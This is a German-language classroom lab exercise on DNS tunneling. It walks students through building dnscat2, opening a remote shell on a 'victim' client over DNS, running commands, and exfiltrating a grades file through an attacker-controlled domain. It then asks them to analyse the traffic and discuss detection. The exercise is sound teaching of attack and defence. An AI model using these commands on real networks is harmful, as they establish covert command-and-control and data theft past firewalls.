    DNS-Tunneling

    Einführung

    Das Domain Name System (DNS) gehört zu den wichtigsten Diensten im Internet. Seine Aufgabe besteht darin, Domainnamen wie www.example.com in die zugehörigen IP-Adressen umzuwandeln, damit eine Verbindung zu einem Server hergestellt werden kann. Da nahezu jede Internetanwendung DNS-Anfragen benötigt, wird entsprechender Netzwerkverkehr in den meisten Netzwerken standardmäßig zugelassen und nur eingeschränkt überwacht.

    Diese Eigenschaft kann jedoch missbraucht werden. Beim DNS-Tunneling werden Informationen in DNS-Anfragen oder DNS-Antworten versteckt und über das DNS-Protokoll übertragen. Dadurch kann ein verdeckter Kommunikationskanal entstehen, der bestehende Sicherheitsmechanismen wie Firewalls oder Netzwerkfilter teilweise umgeht. Angreifer nutzen diese Technik unter anderem zur Steuerung von Schadsoftware oder zum unbemerkten Abfluss sensibler Daten aus einem internen Netzwerk.

    In dieser Übung werden die technischen Grundlagen von DNS sowie die Funktionsweise von DNS-Tunneling untersucht. Mithilfe des Werkzeugs dnscat2 wird demonstriert, wie Daten in DNS-Anfragen eingebettet und über einen versteckten Kanal übertragen werden können. Zusätzlich wird der erzeugte DNS-Verkehr analysiert, um typische Merkmale von DNS-Tunneling zu erkennen und geeignete Maßnahmen zur Erkennung und Verhinderung solcher Angriffe zu diskutieren. Ziel ist es, die Sicherheitsrisiken von DNS-Tunneling zu verstehen und dessen Bedeutung für die Netzwerksicherheit kritisch zu bewerten.

    Ziele

    • verstehen, wie DNS-Anfragen funktionieren
    • erkennen, dass DNS auch als versteckter Kommunikationskanal (Covert Channel) missbraucht werden kann
    • praktisch erleben, wie Daten über DNS übertragen werden
    • Sicherheitsrisiken und Erkennungsmöglichkeiten diskutieren

    Kompetenzzuordnung

    Grundlagen der IT Sicherheit

    • Verschiedene Angriffsmethoden und Maßnahmen zur Absicherung benennen und erklären.

    Methoden und Verfahren der IT-Sicherheit

    • Zugriffsmechanismen konfigurieren

    Netzwerksicherheit

    Voraussetzungen

    • 2 virtuelle Maschinen (oder PCs):

      • Client (Opfer) – z. B. Kali Linux oder Ubuntu
      • Server (Angreifer / DNS-Server) – Linux

    • DeNiSe (DNS tunneling tool)

    • Python
    • Root-/Adminrechte

    Detaillierte Aufgabenbeschreibung

    Aufgabe Grundkompetenz:

    Die Übung besteht aus einem theoretischen und einem praktischen Teil

    Teil 1 – Theorie (Nachlesen und Verstehen).

    Beschreibe die Missbrauchsidee. Hier erste Hinweise.

    DNS erlaubt beliebige Subdomains:

    abc123.domain.com

    Daten können in Subdomains versteckt werden:

    dGhpcyBpcyBhIHRlc3Q=.domain.com

    Server decodiert diese Daten → Tunnel entsteht

    Illustriere zusätzlich mit einer verständlichen Skizze die Architektur und Ablauf darstellt.

    Teil 2: Aufbau des Tunnels

    Aufgabe 1: Repository klonen und kompilieren

    Server:

    sudo apt update
sudo apt install ruby ruby-dev git build-essential -y
git clone https://github.com/iagox86/dnscat2
cd dnscat2/server
sudo gem install bundler
bundle install

    Client:

    sudo apt update
sudo apt install ruby ruby-dev git build-essential -y
git clone https://github.com/iagox86/dnscat2
cd dnscat2/client
make

    Folge den Anweisungen in README.

    Wenn du Kali Linux verwendest, ist hier schon viel für dich vorbereitet: dnscat2 | Kali Linux Tools

    Aufgabe 2: dnscat2-Server starten

    Auf dem Server:

    cd dnscat2/server
sudo ruby dnscat2.rb \
  --dns host=0.0.0.0,port=53 \
  --secret htl2026

    Ausgabe:

    New session established!

    Der Server lauscht nun auf DNS-Port 53.

    Aufgabe 3: Client verbinden

    Auf dem Client:

    sudo ./dnscat \
  --dns server=<SERVER-IP>,port=53 \
  --secret=h tl2026

    Nach erfolgreicher Verbindung erscheint am Server etwa:

    New window created: 1
Session established

    Aufgabe 4: Interaktive Shell öffnen

    Auf dem Server:

    dnscat2>

    Verfügbare Sessions anzeigen:

    sessions

    Beispiel:

    0 - command

    Session öffnen:

    session -i 0

    Nun kann mit dem Client kommuniziert werden.

    Aufgabe 5: Daten übertragen

    Nachricht senden

    Server:

    echo Hallo HTL

    Client erhält die Nachricht über DNS.

    Befehl ausführen

    Server:

    shell

    Danach können Befehle auf dem Client ausgeführt werden:

    whoami
hostname
pwd

    Beispielausgabe:

    Aufgabe 6: DNS-Verkehr analysieren

    Auf dem Server:

    sudo tcpdump -i any port 53

    Beispiel:

    IP 192.168.100.20.45321 > 192.168.100.10.53:
A? dGhpc2lzYWRhdGFjaHVuaw==. (34)

    oder

    Standard query A lskdjf8934jfsdf98sdf

    Die genauen Namen variieren je nach dnscat2-Version.

    Beobachte den DNS-Verkehr während der Übertragung.

    Achte besonders auf:

    • Anzahl der DNS-Anfragen
    • Länge der angefragten Hostnamen
    • Wiederkehrende Muster
    • Auffällige Zeichengruppen

    Notiere mindestens drei Beobachtungen.

    Aufgabe Erweiterte Kompetenz:

    Teil 3 – Realistisches DNS-Tunneling-Szenario mit dnscat2

    Ein Angreifer besitzt die Domain htl-lab.at und betreibt den autoritativen DNS-Server für diese Domain. Ein kompromittierter Rechner im Firmennetz nutzt DNS-Tunneling mit dnscat2, um trotz Firewall-Beschränkungen Daten nach außen zu übertragen.

    Angenommen, die Domain htl-lab.at ist bereits registriert (und natürlich von dir konfiguriert, siehe auch NWTK).

    DNS-Einträge:

    htl-lab.at.      IN NS  ns1.htl-lab.at.
ns1.htl-lab.at.  IN A   203.0.113.10

    Der dnscat2-Server lauscht auf dem autoritativen DNS-Server.

    Client:

    sudo ./dnscat \
 --dns domain=htl-lab.at \
 --secret=htl2026

    Auf dem Client befindet sich noten.txt.

    Inhalt:

    NWTK: Sehr Gut
ITSI: Gut
SEW: Befriedigend

    Lies die Datei über den DNS-Tunnel aus.

    Fragestellungen

    • Welche Rolle spielen Subdomains beim DNS-Tunneling?
    • Warum werden die übertragenen Daten häufig Base64-kodiert?
    • Warum ist DNS-Tunneling oft langsamer als HTTP- oder HTTPS-Kommunikation?
    • Welche DNS-Beschränkungen (Länge, erlaubte Zeichen) müssen Angreifer berücksichtigen?
    • Welche Aufgabe hat der autoritative DNS-Server im Tunneling-Szenario?
    • Welche Unterschiede erkennt man zwischen normalem DNS-Verkehr und DNS-Tunneling?
    • Warum wird DNS-Tunneling häufig von Malware eingesetzt?
    • Welche Vorteile bietet DNS-Tunneling gegenüber direkter Kommunikation über HTTP oder SSH?
    • Warum reicht eine klassische Firewall oft nicht aus, um DNS-Tunneling zu verhindern?
    • Welche Rolle spielen DNS-Firewalls (z. B. Cisco Umbrella, Quad9 oder Cloudflare Gateway)?
    • Welche Hinweise könnte ein IDS wie Snort oder Suricata erkennen?
    • Was sind die wesentlichen Unterschiede zwischen iodine und dnscat2?
